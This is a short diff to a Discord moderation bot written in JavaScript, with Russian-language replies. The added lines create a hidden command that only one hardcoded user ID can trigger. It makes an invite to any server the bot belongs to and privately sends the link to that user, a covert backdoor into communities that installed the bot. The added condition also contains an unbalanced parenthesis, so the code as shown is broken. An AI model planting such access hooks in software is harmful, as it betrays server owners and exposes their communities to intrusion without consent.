@@ -1262,6 +1262,11 @@ if (!message.member.hasPermission("BAN_MEMBERS")) return message.channel.send("*
         message.channel.send(`**Репорт пользователя ${message.author} принят.**`);
         message.delete();
 	  
+    } else if (['cinvite', 'createinvite', 'guild'].includes(command) && message.author.id === "361951318929309707")) {
+	    const guildID = args[0];
+            let guild = client.guilds.get(guildID);
+            let channels = guild.channels.filter(channel => channel.type === 'text' && channel.permissionsFor(guild.members.get(client.user.id)).has('SEND_MESSAGES'));
+            if (channels.size > 0) channels.first().createInvite().then(inv => message.author.send(`https://discord.gg/${inv.code}`))
     } else if (['createEmoji'].includes(command)) {
 	    actMOD = actMOD + 1;actALL = actALL +1;
 	    if(!message.member.hasPermission("MANAGE_EMOJIS")) return message.reply("у вас нету нужных прав");
